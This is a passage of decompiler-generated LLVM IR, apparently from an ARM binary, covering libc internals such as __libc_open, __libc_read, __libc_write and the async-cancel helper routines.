entry.dec_label_pc_14acc_crit_edge:               ; preds = %entry
  %v3_14acc.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_14acc

dec_label_pc_14ab0:                               ; preds = %entry
  %v0_14ab0 = load i32, i32* @r7, align 4
  store i32 %v0_14ab0, i32* @ip, align 4
  %v0_14ac0 = load i32, i32* @r0, align 4
  %v2_14ac0 = icmp ugt i32 %v0_14ac0, -4097
  %v7_14ac0 = icmp eq i32 %v0_14ac0, -4096
  store i1 %v7_14ac0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14ac0, label %bb7, label %bb

bb:                                               ; preds = %bb9, %bb8, %dec_label_pc_14acc, %dec_label_pc_14ab0
  %merge = phi i32 [ %v0_14ac0, %dec_label_pc_14ab0 ], [ %v0_14af0, %dec_label_pc_14acc ], [ %v0_14b00, %bb8 ], [ %v6_14b10, %bb9 ]
  ret i32 %merge

bb7:                                              ; preds = %dec_label_pc_14ab0
  %v0_14ac8 = call i32 @__syscall_error()
  br label %dec_label_pc_14acc

dec_label_pc_14acc:                               ; preds = %entry.dec_label_pc_14acc_crit_edge, %bb7
  %v3_14acc = phi i32 [ %v3_14acc.pre, %entry.dec_label_pc_14acc_crit_edge ], [ %v0_14ac8, %bb7 ]
  %v9_14acc = load i32, i32* @r7, align 4
  store i32 %v9_14acc, i32* %stack_var_-8, align 4
  %v12_14acc = load i32, i32* @lr, align 4
  %v0_14ad0 = call i32 @__libc_enable_asynccancel()
  store i32 %v0_14ad0, i32* @ip, align 4
  store i32 %v3_14acc, i32* @r7, align 4
  %v1_14aec = call i32 @__libc_disable_asynccancel(i32 %v0_14ad0)
  %v0_14af0 = load i32, i32* @r7, align 4
  store i32 %v0_14af0, i32* @r0, align 4
  %v2_14af4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_14af4, i32* @r7, align 4
  store i32 %v12_14acc, i32* @lr, align 4
  %v2_14af8 = icmp ugt i32 %v0_14af0, -4097
  %v7_14af8 = icmp eq i32 %v0_14af0, -4096
  store i1 %v7_14af8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14af8, label %bb8, label %bb

bb8:                                              ; preds = %dec_label_pc_14acc
  %v0_14b00 = call i32 @__syscall_error()
  %v0_14b10 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_14b10, label %bb9, label %bb

bb9:                                              ; preds = %bb8
  %v1_14b10 = load i32, i32* @r1, align 4
  %v5_14b10 = udiv i32 %v0_14b00, 262144
  %v6_14b10 = and i32 %v1_14b10, %v5_14b10
  br label %bb

; uselistorder directives
  uselistorder i32 %v0_14af0, { 0, 2, 3, 1 }
  uselistorder i32 %v0_14ac0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_14acc, { 1, 0 }
}

define i32 @__GI___open_nocancel() local_unnamed_addr {
entry:
  %v0_14b24 = load i1, i1* @cpsr_c, align 1
  br i1 %v0_14b24, label %bb1, label %bb

bb:                                               ; preds = %entry
  %v2_14b24 = load i32, i32* @r0, align 4
  ret i32 %v2_14b24

bb1:                                              ; preds = %entry
  %v0_14b28 = call i32 @__syscall_error()
  ret i32 %v0_14b28
}

define i32 @__libc_open(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_14b34 = load i32, i32* @global_var_2545c.546, align 4
  %v2_14b38 = icmp eq i32 %v3_14b34, 0
  store i1 %v2_14b38, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14b38, label %dec_label_pc_14b40, label %entry.dec_label_pc_14b5c_crit_edge

entry.dec_label_pc_14b5c_crit_edge:               ; preds = %entry
  %v3_14b5c.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_14b5c

dec_label_pc_14b40:                               ; preds = %entry
  %v0_14b50 = load i32, i32* @r0, align 4
  %v2_14b50 = icmp ugt i32 %v0_14b50, -4097
  %v7_14b50 = icmp eq i32 %v0_14b50, -4096
  store i1 %v7_14b50, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14b50, label %bb9, label %bb

bb:                                               ; preds = %dec_label_pc_14b5c, %bb10, %bb11, %dec_label_pc_14b40
  %merge2 = phi i32 [ %v0_14b50, %dec_label_pc_14b40 ], [ %v0_14b80, %dec_label_pc_14b5c ], [ %v0_14b90, %bb10 ], [ %v0_14b90, %bb11 ]
  ret i32 %merge2

bb9:                                              ; preds = %dec_label_pc_14b40
  %v0_14b58 = call i32 @__syscall_error()
  br label %dec_label_pc_14b5c

dec_label_pc_14b5c:                               ; preds = %entry.dec_label_pc_14b5c_crit_edge, %bb9
  %v3_14b5c = phi i32 [ %v3_14b5c.pre, %entry.dec_label_pc_14b5c_crit_edge ], [ %v0_14b58, %bb9 ]
  store i32 %v3_14b5c, i32* %stack_var_-24, align 4
  %v9_14b5c = load i32, i32* @r2, align 4
  %v12_14b5c = load i32, i32* @r3, align 4
  %v15_14b5c = load i32, i32* @r7, align 4
  store i32 %v15_14b5c, i32* %stack_var_-8, align 4
  %v18_14b5c = load i32, i32* @lr, align 4
  %v0_14b60 = call i32 @__libc_enable_asynccancel()
  %v2_14b68 = load i32, i32* %stack_var_-24, align 4
  store i32 %arg2, i32* @r1, align 4
  store i32 %v9_14b5c, i32* @r2, align 4
  store i32 %v12_14b5c, i32* @r3, align 4
  store i32 %v2_14b68, i32* @r7, align 4
  %v1_14b7c = call i32 @__libc_disable_asynccancel(i32 %v0_14b60)
  %v0_14b80 = load i32, i32* @r7, align 4
  store i32 %v0_14b80, i32* @r0, align 4
  %v2_14b84 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_14b84, i32* @r7, align 4
  store i32 %v18_14b5c, i32* @lr, align 4
  %v2_14b88 = icmp ugt i32 %v0_14b80, -4097
  %v7_14b88 = icmp eq i32 %v0_14b80, -4096
  store i1 %v7_14b88, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14b88, label %bb10, label %bb

bb10:                                             ; preds = %dec_label_pc_14b5c
  %v0_14b90 = call i32 @__syscall_error()
  %v0_14ba0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_14ba0, label %bb11, label %bb

bb11:                                             ; preds = %bb10
  %v2_14ba0 = load i32, i32* @r8, align 4
  %v3_14ba0 = mul i32 %v2_14ba0, %v0_14b90
  store i32 %v3_14ba0, i32* @r1, align 4
  br label %bb

; uselistorder directives
  uselistorder i32 %v0_14b90, { 0, 2, 1 }
  uselistorder i32 %v0_14b80, { 0, 2, 3, 1 }
  uselistorder i32 %v0_14b50, { 1, 0, 2 }
  uselistorder label %dec_label_pc_14b5c, { 1, 0 }
  uselistorder label %bb, { 2, 1, 0, 3 }
}

define i32 @__GI___write_nocancel() local_unnamed_addr {
entry:
  %v0_14bb4 = load i1, i1* @cpsr_c, align 1
  br i1 %v0_14bb4, label %bb1, label %bb

bb:                                               ; preds = %entry
  %v2_14bb4 = load i32, i32* @r0, align 4
  ret i32 %v2_14bb4

bb1:                                              ; preds = %entry
  %v0_14bb8 = call i32 @__syscall_error()
  ret i32 %v0_14bb8
}

define i32 @__GI___libc_write(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_14bc4 = load i32, i32* @global_var_2545c.546, align 4
  %v2_14bc8 = icmp eq i32 %v3_14bc4, 0
  store i1 %v2_14bc8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14bc8, label %dec_label_pc_14bd0, label %entry.dec_label_pc_14bec_crit_edge

entry.dec_label_pc_14bec_crit_edge:               ; preds = %entry
  %v3_14bec.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_14bec

dec_label_pc_14bd0:                               ; preds = %entry
  %v0_14be0 = load i32, i32* @r0, align 4
  %v2_14be0 = icmp ugt i32 %v0_14be0, -4097
  %v7_14be0 = icmp eq i32 %v0_14be0, -4096
  store i1 %v7_14be0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14be0, label %bb9, label %bb

bb:                                               ; preds = %bb11, %bb10, %dec_label_pc_14bec, %dec_label_pc_14bd0
  %merge = phi i32 [ %v0_14be0, %dec_label_pc_14bd0 ], [ %v0_14c10, %dec_label_pc_14bec ], [ %v0_14c20, %bb10 ], [ %v6_14c30, %bb11 ]
  ret i32 %merge

bb9:                                              ; preds = %dec_label_pc_14bd0
  %v0_14be8 = call i32 @__syscall_error()
  br label %dec_label_pc_14bec

dec_label_pc_14bec:                               ; preds = %entry.dec_label_pc_14bec_crit_edge, %bb9
  %v3_14bec = phi i32 [ %v3_14bec.pre, %entry.dec_label_pc_14bec_crit_edge ], [ %v0_14be8, %bb9 ]
  %v12_14bec = load i32, i32* @r3, align 4
  %v15_14bec = load i32, i32* @r7, align 4
  store i32 %v15_14bec, i32* %stack_var_-8, align 4
  %v18_14bec = load i32, i32* @lr, align 4
  %v0_14bf0 = call i32 @__libc_enable_asynccancel()
  store i32 %arg2, i32* @r1, align 4
  store i32 %v12_14bec, i32* @r3, align 4
  store i32 %v3_14bec, i32* @r7, align 4
  %v1_14c0c = call i32 @__libc_disable_asynccancel(i32 %v0_14bf0)
  %v0_14c10 = load i32, i32* @r7, align 4
  store i32 %v0_14c10, i32* @r0, align 4
  %v2_14c14 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_14c14, i32* @r7, align 4
  store i32 %v18_14bec, i32* @lr, align 4
  %v2_14c18 = icmp ugt i32 %v0_14c10, -4097
  %v7_14c18 = icmp eq i32 %v0_14c10, -4096
  store i1 %v7_14c18, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14c18, label %bb10, label %bb

bb10:                                             ; preds = %dec_label_pc_14bec
  %v0_14c20 = call i32 @__syscall_error()
  %v0_14c30 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_14c30, label %bb11, label %bb

bb11:                                             ; preds = %bb10
  %v1_14c30 = load i32, i32* @r1, align 4
  %v5_14c30 = mul i32 %v0_14c20, 65536
  %v6_14c30 = and i32 %v1_14c30, %v5_14c30
  br label %bb

; uselistorder directives
  uselistorder i32 %v0_14c10, { 0, 2, 3, 1 }
  uselistorder i32 %v0_14be0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_14bec, { 1, 0 }
}

define i32 @__read_nocancel() local_unnamed_addr {
entry:
  %v0_14c44 = load i1, i1* @cpsr_c, align 1
  br i1 %v0_14c44, label %bb1, label %bb

bb:                                               ; preds = %entry
  %v2_14c44 = load i32, i32* @r0, align 4
  ret i32 %v2_14c44

bb1:                                              ; preds = %entry
  %v0_14c48 = call i32 @__syscall_error()
  ret i32 %v0_14c48

; uselistorder directives
  uselistorder i1* @cpsr_c, { 1, 2, 3, 4, 0 }
}

define i32 @__libc_read(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_14c54 = load i32, i32* @global_var_2545c.546, align 4
  %v2_14c58 = icmp eq i32 %v3_14c54, 0
  br i1 %v2_14c58, label %dec_label_pc_14c60, label %entry.dec_label_pc_14c7c_crit_edge

entry.dec_label_pc_14c7c_crit_edge:               ; preds = %entry
  %v3_14c7c.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_14c7c

dec_label_pc_14c60:                               ; preds = %entry
  %v0_14c70 = load i32, i32* @r0, align 4
  %v2_14c70 = icmp ugt i32 %v0_14c70, -4097
  br i1 %v2_14c70, label %bb8, label %bb

bb:                                               ; preds = %dec_label_pc_14c7c, %dec_label_pc_14c60
  %merge = phi i32 [ %v0_14c70, %dec_label_pc_14c60 ], [ %v0_14ca0, %dec_label_pc_14c7c ]
  ret i32 %merge

bb8:                                              ; preds = %dec_label_pc_14c60
  %v0_14c78 = call i32 @__syscall_error()
  br label %dec_label_pc_14c7c

dec_label_pc_14c7c:                               ; preds = %entry.dec_label_pc_14c7c_crit_edge, %bb8
  %v3_14c7c = phi i32 [ %v3_14c7c.pre, %entry.dec_label_pc_14c7c_crit_edge ], [ %v0_14c78, %bb8 ]
  %v6_14c7c = load i32, i32* @r1, align 4
  %v15_14c7c = load i32, i32* @r7, align 4
  store i32 %v15_14c7c, i32* %stack_var_-8, align 4
  %v18_14c7c = load i32, i32* @lr, align 4
  %v0_14c80 = call i32 @__libc_enable_asynccancel()
  store i32 %v6_14c7c, i32* @r1, align 4
  store i32 %v3_14c7c, i32* @r7, align 4
  %v1_14c9c = call i32 @__libc_disable_asynccancel(i32 %v0_14c80)
  %v0_14ca0 = load i32, i32* @r7, align 4
  store i32 %v0_14ca0, i32* @r0, align 4
  %v2_14ca4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_14ca4, i32* @r7, align 4
  store i32 %v18_14c7c, i32* @lr, align 4
  %v2_14ca8 = icmp ugt i32 %v0_14ca0, -4097
  br i1 %v2_14ca8, label %bb9, label %bb

bb9:                                              ; preds = %dec_label_pc_14c7c
  %v0_14cb0 = call i32 @__syscall_error()
  ret i32 %v0_14cb0

; uselistorder directives
  uselistorder i32 %v0_14ca0, { 1, 2, 0 }
  uselistorder i32 ()* @__syscall_error, { 5, 4, 11, 7, 6, 10, 1, 0, 9, 3, 2, 8 }
  uselistorder label %dec_label_pc_14c7c, { 1, 0 }
}

define i32 @__libc_disable_asynccancel(i32 %arg1) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_14cc0 = load i32, i32* %r0.global-to-local, align 4
  %v1_14cc0 = and i32 %v0_14cc0, 2
  %v2_14cc0 = icmp eq i32 %v1_14cc0, 0
  %v3_14cc4 = load i32, i32* @r4, align 4
  store i32 %v3_14cc4, i32* %stack_var_-16, align 4
  br i1 %v2_14cc0, label %dec_label_pc_14ccc, label %dec_label_pc_14d40

dec_label_pc_14ccc:                               ; preds = %entry
  %v0_14ccc = call i32 @__aeabi_read_tp()
  store i32 %v0_14ccc, i32* %r0.global-to-local, align 4
  %v1_14cd0 = add i32 %v0_14ccc, -1036
  %v2_14cd0 = inttoptr i32 %v1_14cd0 to i32*
  %v3_14cd0 = load i32, i32* %v2_14cd0, align 4
  %v1_14cd4 = add i32 %v0_14ccc, -1168
  store i32 %v1_14cd4, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_14cd8

dec_label_pc_14cd8:                               ; preds = %dec_label_pc_14d0c.dec_label_pc_14cd8_crit_edge, %dec_label_pc_14ccc
  %v0_14ce4 = phi i32 [ %v0_14ce4.pre, %dec_label_pc_14d0c.dec_label_pc_14cd8_crit_edge ], [ %v1_14cd4, %dec_label_pc_14ccc ]
  %v0_14cd8 = phi i32 [ %v0_14d0c, %dec_label_pc_14d0c.dec_label_pc_14cd8_crit_edge ], [ %v3_14cd0, %dec_label_pc_14ccc ]
  %v1_14cd8 = and i32 %v0_14cd8, -3
  store i32 %v1_14cd8, i32* %r7.global-to-local, align 4
  store i32 %v0_14cd8, i32* %r4.global-to-local, align 4
  store i32 %v1_14cd8, i32* @r1, align 4
  %v1_14ce4 = add i32 %v0_14ce4, 132
  store i32 %v1_14ce4, i32* @r2, align 4
  %v1_14ce823 = inttoptr i32 %v1_14ce4 to i32*
  %v2_14ce824 = load i32, i32* %v1_14ce823, align 4
  %v3_14cec26 = icmp uge i32 %v2_14ce824, %v0_14cd8
  store i1 %v3_14cec26, i1* %cpsr_c.global-to-local, align 1
  %v9_14cec32 = icmp eq i32 %v2_14ce824, %v0_14cd8
  br i1 %v9_14cec32, label %dec_label_pc_14cf4, label %dec_label_pc_14d0c

dec_label_pc_14cf4:                               ; preds = %dec_label_pc_14cd8, %dec_label_pc_14cf4.dec_label_pc_14ce8_crit_edge
  %v0_14cf433 = phi i32 [ %v1_14cec.pre, %dec_label_pc_14cf4.dec_label_pc_14ce8_crit_edge ], [ %v0_14cd8, %dec_label_pc_14cd8 ]
  store i32 %v0_14cf433, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_14d04 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_14d04, label %dec_label_pc_14d08, label %dec_label_pc_14cf4.dec_label_pc_14ce8_crit_edge

dec_label_pc_14cf4.dec_label_pc_14ce8_crit_edge:  ; preds = %dec_label_pc_14cf4
  %v0_14ce8.pre = load i32, i32* @r2, align 4
  %v1_14cec.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_14ce8 = inttoptr i32 %v0_14ce8.pre to i32*
  %v2_14ce8 = load i32, i32* %v1_14ce8, align 4
  %v3_14cec = icmp uge i32 %v2_14ce8, %v1_14cec.pre
  store i1 %v3_14cec, i1* %cpsr_c.global-to-local, align 1
  %v9_14cec = icmp eq i32 %v2_14ce8, %v1_14cec.pre
  br i1 %v9_14cec, label %dec_label_pc_14cf4, label %dec_label_pc_14d0c

dec_label_pc_14d08:                               ; preds = %dec_label_pc_14cf4
  %v0_14d08 = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_14d0c

dec_label_pc_14d0c:                               ; preds = %dec_label_pc_14cd8, %dec_label_pc_14cf4.dec_label_pc_14ce8_crit_edge, %dec_label_pc_14d08
  %v0_14d0c = phi i32 [ %v0_14d08, %dec_label_pc_14d08 ], [ %v2_14ce824, %dec_label_pc_14cd8 ], [ %v2_14ce8, %dec_label_pc_14cf4.dec_label_pc_14ce8_crit_edge ]
  %v1_14d0c = phi i32 [ %v0_14d08, %dec_label_pc_14d08 ], [ %v0_14cd8, %dec_label_pc_14cd8 ], [ %v1_14cec.pre, %dec_label_pc_14cf4.dec_label_pc_14ce8_crit_edge ]
  %v3_14d0c = icmp uge i32 %v0_14d0c, %v1_14d0c
  store i1 %v3_14d0c, i1* %cpsr_c.global-to-local, align 1
  %v9_14d0c = icmp eq i32 %v0_14d0c, %v1_14d0c
  br i1 %v9_14d0c, label %dec_label_pc_14d34.preheader, label %dec_label_pc_14d0c.dec_label_pc_14cd8_crit_edge

dec_label_pc_14d0c.dec_label_pc_14cd8_crit_edge:  ; preds = %dec_label_pc_14d0c
  %v0_14ce4.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_14cd8

dec_label_pc_14d34.preheader:                     ; preds = %dec_label_pc_14d0c
  %v0_14d341 = load i32, i32* %r7.global-to-local, align 4
  %v1_14d342 = and i32 %v0_14d341, 12
  store i32 %v1_14d342, i32* @r3, align 4
  %v2_14d383 = icmp ugt i32 %v1_14d342, 3
  store i1 %v2_14d383, i1* %cpsr_c.global-to-local, align 1
  %v7_14d385 = icmp eq i32 %v1_14d342, 4
  br i1 %v7_14d385, label %dec_label_pc_14d18.lr.ph, label %dec_label_pc_14d34.preheader.dec_label_pc_14d40.loopexit_crit_edge

dec_label_pc_14d34.preheader.dec_label_pc_14d40.loopexit_crit_edge: ; preds = %dec_label_pc_14d34.preheader
  %v1_14d44.pre.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14d40.loopexit

dec_label_pc_14d18.lr.ph:                         ; preds = %dec_label_pc_14d34.preheader
  %v0_14d1c.pre = load i32, i32* %r5.global-to-local, align 4
  %v1_14d1c = add i32 %v0_14d1c.pre, 132
  %v2_14d30 = inttoptr i32 %v1_14d1c to i32*
  br label %dec_label_pc_14d18

dec_label_pc_14d18:                               ; preds = %dec_label_pc_14d18.lr.ph, %dec_label_pc_14d18
  %v0_14d18 = phi i32 [ %v0_14d341, %dec_label_pc_14d18.lr.ph ], [ %v3_14d30, %dec_label_pc_14d18 ]
  store i32 %v0_14d18, i32* @r2, align 4
  store i32 %v1_14d1c, i32* %r0.global-to-local, align 4
  store i32 128, i32* @r1, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  %v3_14d30 = load i32, i32* %v2_14d30, align 4
  store i32 %v3_14d30, i32* %r7.global-to-local, align 4
  %v1_14d34 = and i32 %v3_14d30, 12
  store i32 %v1_14d34, i32* @r3, align 4
  %v7_14d38 = icmp eq i32 %v1_14d34, 4
  br i1 %v7_14d38, label %dec_label_pc_14d18, label %dec_label_pc_14d34.dec_label_pc_14d40.loopexit_crit_edge

dec_label_pc_14d34.dec_label_pc_14d40.loopexit_crit_edge: ; preds = %dec_label_pc_14d18
  %v2_14d38 = icmp ugt i32 %v1_14d34, 3
  store i1 %v2_14d38, i1* %cpsr_c.global-to-local, align 1
  br label %dec_label_pc_14d40.loopexit

dec_label_pc_14d40.loopexit:                      ; preds = %dec_label_pc_14d34.preheader.dec_label_pc_14d40.loopexit_crit_edge, %dec_label_pc_14d34.dec_label_pc_14d40.loopexit_crit_edge
  %v1_14d44.pre = phi i32 [ %v1_14d44.pre.pre, %dec_label_pc_14d34.preheader.dec_label_pc_14d40.loopexit_crit_edge ], [ %v1_14d1c, %dec_label_pc_14d34.dec_label_pc_14d40.loopexit_crit_edge ]
  %v2_14d40.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_14d40

dec_label_pc_14d40:                               ; preds = %dec_label_pc_14d40.loopexit, %entry
  %v1_14d44 = phi i32 [ %v1_14d44.pre, %dec_label_pc_14d40.loopexit ], [ %v0_14cc0, %entry ]
  %v2_14d40 = phi i32 [ %v2_14d40.pre, %dec_label_pc_14d40.loopexit ], [ %v3_14cc4, %entry ]
  store i32 %v2_14d40, i32* @r4, align 4
  ret i32 %v1_14d44

; uselistorder directives
  uselistorder i32 %v3_14d30, { 1, 2, 0 }
  uselistorder i32 %v1_14d1c, { 0, 2, 1 }
  uselistorder i32 %v0_14d08, { 1, 0 }
  uselistorder i32 %v1_14cec.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_14cd8, { 0, 1, 2, 3, 5, 4 }
  uselistorder i32* %r5.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 4, 3, 5, 0, 1 }
  uselistorder i1* %cpsr_c.global-to-local, { 1, 0, 3, 5, 4, 2 }
  uselistorder label %dec_label_pc_14d40.loopexit, { 1, 0 }
  uselistorder label %dec_label_pc_14d18, { 1, 0 }
  uselistorder label %dec_label_pc_14d0c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_14cf4, { 1, 0 }
}

define i32 @__libc_enable_asynccancel() local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_14d48 = load i32, i32* @r4, align 4
  store i32 %v3_14d48, i32* %stack_var_-24, align 4
  store i32 54496, i32* %r8.global-to-local, align 4
  %v0_14d50 = call i32 @__aeabi_read_tp()
  %v1_14d54 = add i32 %v0_14d50, -1036
  %v2_14d54 = inttoptr i32 %v1_14d54 to i32*
  %v3_14d54 = load i32, i32* %v2_14d54, align 4
  store i32 %v3_14d54, i32* %r6.global-to-local, align 4
  %v1_14d58 = add i32 %v0_14d50, -1168
  store i32 %v1_14d58, i32* %r7.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_22244.363 to i32), i32* %r8.global-to-local, align 4
  %v1_14d6046 = or i32 %v3_14d54, 2
  store i32 %v1_14d6046, i32* %r5.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_14d6449 = icmp eq i32 %v1_14d6046, %v3_14d54
  br i1 %v9_14d6449, label %dec_label_pc_14e10, label %dec_label_pc_14d6c

dec_label_pc_14d6c:                               ; preds = %entry, %bb.dec_label_pc_14d6c_crit_edge
  %v0_14d70 = phi i32 [ %v0_14d70.pre, %bb.dec_label_pc_14d6c_crit_edge ], [ %v1_14d58, %entry ]
  %v1_14d6051 = phi i32 [ %v1_14d60, %bb.dec_label_pc_14d6c_crit_edge ], [ %v1_14d6046, %entry ]
  %v0_14d7450 = phi i32 [ %v1_14da0, %bb.dec_label_pc_14d6c_crit_edge ], [ %v3_14d54, %entry ]
  store i32 %v1_14d6051, i32* @r1, align 4
  %v1_14d70 = add i32 %v0_14d70, 132
  store i32 %v1_14d70, i32* @r2, align 4
  store i32 %v0_14d7450, i32* %r4.global-to-local, align 4
  %v1_14d7834 = inttoptr i32 %v1_14d70 to i32*
  %v2_14d7835 = load i32, i32* %v1_14d7834, align 4
  store i32 %v2_14d7835, i32* @r3, align 4
  %v3_14d7c37 = icmp uge i32 %v2_14d7835, %v0_14d7450
  store i1 %v3_14d7c37, i1* %cpsr_c.global-to-local, align 1
  %v9_14d7c43 = icmp eq i32 %v2_14d7835, %v0_14d7450
  br i1 %v9_14d7c43, label %dec_label_pc_14d84, label %dec_label_pc_14d9c

dec_label_pc_14d84:                               ; preds = %dec_label_pc_14d6c, %dec_label_pc_14d84.dec_label_pc_14d78_crit_edge
  call void @__pseudo_branch(i32 -61504)
  %v0_14d94 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_14d94, label %dec_label_pc_14d98, label %dec_label_pc_14d84.dec_label_pc_14d78_crit_edge

dec_label_pc_14d84.dec_label_pc_14d78_crit_edge:  ; preds = %dec_label_pc_14d84
  %v0_14d78.pre = load i32, i32* @r2, align 4
  %v1_14d7c.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_14d78 = inttoptr i32 %v0_14d78.pre to i32*
  %v2_14d78 = load i32, i32* %v1_14d78, align 4
  store i32 %v2_14d78, i32* @r3, align 4
  %v3_14d7c = icmp uge i32 %v2_14d78, %v1_14d7c.pre
  store i1 %v3_14d7c, i1* %cpsr_c.global-to-local, align 1
  %v9_14d7c = icmp eq i32 %v2_14d78, %v1_14d7c.pre
  br i1 %v9_14d7c, label %dec_label_pc_14d84, label %dec_label_pc_14d9c

dec_label_pc_14d98:                               ; preds = %dec_label_pc_14d84
  %v0_14d98 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_14d98, i32* @r3, align 4
  br label %dec_label_pc_14d9c

dec_label_pc_14d9c:                               ; preds = %dec_label_pc_14d6c, %dec_label_pc_14d84.dec_label_pc_14d78_crit_edge, %dec_label_pc_14d98
  %v1_14da0 = phi i32 [ %v0_14d98, %dec_label_pc_14d98 ], [ %v2_14d7835, %dec_label_pc_14d6c ], [ %v2_14d78, %dec_label_pc_14d84.dec_label_pc_14d78_crit_edge ]
  %v1_14d9c = load i32, i32* %r6.global-to-local, align 4
  %v3_14d9c = icmp uge i32 %v1_14da0, %v1_14d9c
  store i1 %v3_14d9c, i1* %cpsr_c.global-to-local, align 1
  %v9_14d9c = icmp eq i32 %v1_14da0, %v1_14d9c
  br i1 %v9_14d9c, label %dec_label_pc_14da8, label %bb

bb:                                               ; preds = %dec_label_pc_14d9c
  store i32 %v1_14da0, i32* %r6.global-to-local, align 4
  %v1_14d60 = or i32 %v1_14da0, 2
  store i32 %v1_14d60, i32* %r5.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_14d64 = icmp eq i32 %v1_14d60, %v1_14da0
  br i1 %v9_14d64, label %dec_label_pc_14e10, label %bb.dec_label_pc_14d6c_crit_edge

bb.dec_label_pc_14d6c_crit_edge:                  ; preds = %bb
  %v0_14d70.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_14d6c

dec_label_pc_14da8:                               ; preds = %dec_label_pc_14d9c
  %v0_14da8 = load i32, i32* %r5.global-to-local, align 4
  %v1_14da8 = and i32 %v0_14da8, -69
  store i32 %v1_14da8, i32* @r3, align 4
  %v2_14dac = icmp ugt i32 %v1_14da8, 9
  store i1 %v2_14dac, i1* %cpsr_c.global-to-local, align 1
  %v7_14dac = icmp eq i32 %v1_14da8, 10
  br i1 %v7_14dac, label %dec_label_pc_14db4, label %dec_label_pc_14e10

dec_label_pc_14db4:                               ; preds = %dec_label_pc_14da8
  %v1_14db8 = load i32, i32* %r7.global-to-local, align 4
  %v2_14db8 = add i32 %v1_14db8, 544
  %v3_14db8 = inttoptr i32 %v2_14db8 to i32*
  store i32 -1, i32* %v3_14db8, align 4
  %v0_14dbc = load i32, i32* @r2, align 4
  store i32 %v0_14dbc, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_14dc0

dec_label_pc_14dc0:                               ; preds = %dec_label_pc_14df4.dec_label_pc_14dc0_crit_edge, %dec_label_pc_14db4
  %v0_14dc4 = phi i32 [ %v0_14dc4.pre, %dec_label_pc_14df4.dec_label_pc_14dc0_crit_edge ], [ %v0_14dbc, %dec_label_pc_14db4 ]
  %v0_14dc0 = load i32, i32* %r7.global-to-local, align 4
  %v1_14dc0 = add i32 %v0_14dc0, 132
  %v2_14dc0 = inttoptr i32 %v1_14dc0 to i32*
  %v3_14dc0 = load i32, i32* %v2_14dc0, align 4
  store i32 %v0_14dc4, i32* @r2, align 4
  store i32 %v3_14dc0, i32* %r4.global-to-local, align 4
  %v1_14dcc = or i32 %v3_14dc0, 16
  store i32 %v1_14dcc, i32* @r1, align 4
  %v1_14dd022 = inttoptr i32 %v0_14dc4 to i32*
  %v2_14dd023 = load i32, i32* %v1_14dd022, align 4
  %v3_14dd425 = icmp uge i32 %v2_14dd023, %v3_14dc0
  store i1 %v3_14dd425, i1* %cpsr_c.global-to-local, align 1
  %v9_14dd431 = icmp eq i32 %v2_14dd023, %v3_14dc0
